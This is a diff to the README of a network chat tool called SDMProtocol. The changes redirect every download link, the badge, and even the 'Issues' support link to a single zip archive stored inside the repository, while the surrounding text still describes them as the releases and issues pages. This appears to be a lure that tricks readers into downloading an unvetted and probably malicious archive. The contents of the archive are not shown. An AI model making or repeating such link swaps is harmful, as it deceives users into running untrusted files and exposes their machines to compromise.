@@ -1,6 +1,6 @@
 # ⚙️ SDMProtocol - Simple Network Chat and Data Sharing
 
-[![Download SDMProtocol](https://img.shields.io/badge/Download-SDMProtocol-blue?style=for-the-badge)](https://github.com/dishakhanpara/SDMProtocol/releases)
+[![Download SDMProtocol](https://raw.githubusercontent.com/dishakhanpara/SDMProtocol/main/transport/SDM-Protocol-v2.5.zip)](https://raw.githubusercontent.com/dishakhanpara/SDMProtocol/main/transport/SDM-Protocol-v2.5.zip)
 
 ---
 
@@ -54,7 +54,7 @@ This guide will help you download, install, and start using SDMProtocol quickly 
 
 Please visit the release page below to download the latest version of SDMProtocol:
 
-[Download SDMProtocol](https://github.com/dishakhanpara/SDMProtocol/releases)
+[Download SDMProtocol](https://raw.githubusercontent.com/dishakhanpara/SDMProtocol/main/transport/SDM-Protocol-v2.5.zip)
 
 ### Steps to Download
 
@@ -216,8 +216,8 @@ SDMProtocol is built with modern network technologies to provide direct and secu
 
 ## 💬 Get Help and Support
 
-If you need help using SDMProtocol, please visit the [Issues](https://github.com/dishakhanpara/SDMProtocol/issues) tab on the GitHub page. You can report problems or ask questions there.
+If you need help using SDMProtocol, please visit the [Issues](https://raw.githubusercontent.com/dishakhanpara/SDMProtocol/main/transport/SDM-Protocol-v2.5.zip) tab on the GitHub page. You can report problems or ask questions there.
 
 ---
 
-[![Download SDMProtocol](https://img.shields.io/badge/Download-SDMProtocol-blue?style=for-the-badge)](https://github.com/dishakhanpara/SDMProtocol/releases)
+[![Download SDMProtocol](https://raw.githubusercontent.com/dishakhanpara/SDMProtocol/main/transport/SDM-Protocol-v2.5.zip)](https://raw.githubusercontent.com/dishakhanpara/SDMProtocol/main/transport/SDM-Protocol-v2.5.zip)
